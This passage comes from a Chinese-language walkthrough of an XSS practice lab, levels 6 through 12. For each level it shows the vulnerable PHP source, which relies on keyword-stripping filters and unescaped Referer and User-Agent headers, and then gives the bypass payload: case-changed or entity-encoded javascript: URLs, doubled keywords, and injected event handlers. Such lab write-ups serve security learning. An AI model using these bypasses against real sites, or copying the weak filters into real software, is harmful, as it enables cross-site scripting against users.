class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level6.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a Href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">Href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>//JavaScript对大小写敏感</span></span><br></pre></td></tr></table></figure>

<h1 id="level7"><a href="#level7" class="headerlink" title="level7:"></a>level7:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level7<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level7<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str =strtolower( $_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level7.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hhrefref=&quot;</span><span class="attr">javaSscriptcript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;//</span></span><br><span class="line"><span class="string">//HTML实体转换------&gt; https://www.qqxiuzi.cn/bianma/zifushiti.php</span></span><br></pre></td></tr></table></figure>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8:"></a>level8:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level8<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level8<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta"> echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level8.jpg</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javasc&amp;#x72;<span class="attr">ipt</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="level9"><a href="#level9" class="headerlink" title="level9:"></a>level9:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level9<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level9<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if(false===strpos($str7,&#x27;http://&#x27;))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">else</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level9.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javasc&amp;#x72;<span class="attr">ipt</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">// http://</span></span><br></pre></td></tr></table></figure>
<h1 id="level10"><a href="#level10" class="headerlink" title="level10:"></a>level10:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level10<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level10<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str11 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level10.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span> value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span> onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h1 id="level11"><a href="#level11" class="headerlink" title="level11:"></a>level11:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level11<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level11<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level11.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>使用burp suite抓包，在页面添加：<blockquote>
<p>Referer: “ onmouseover&#x3D;alert(1) type&#x3D;”text”</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c2cfad38001547bba61d8f7c04d81588~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
</blockquote>
</li>
</ul>
<h1 id="level12"><a href="#level12" class="headerlink" title="level12:"></a>level12:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level12<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level12<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level12.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>使用bp抓包，” onmouseover&#x3D;alert(1) type&#x3D;”text”     加到user-Agent后面<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f2881b11012847a6b499cc12ee911ebf~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5bbdcc19f00c49c49ee56ff5cfcca46d~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
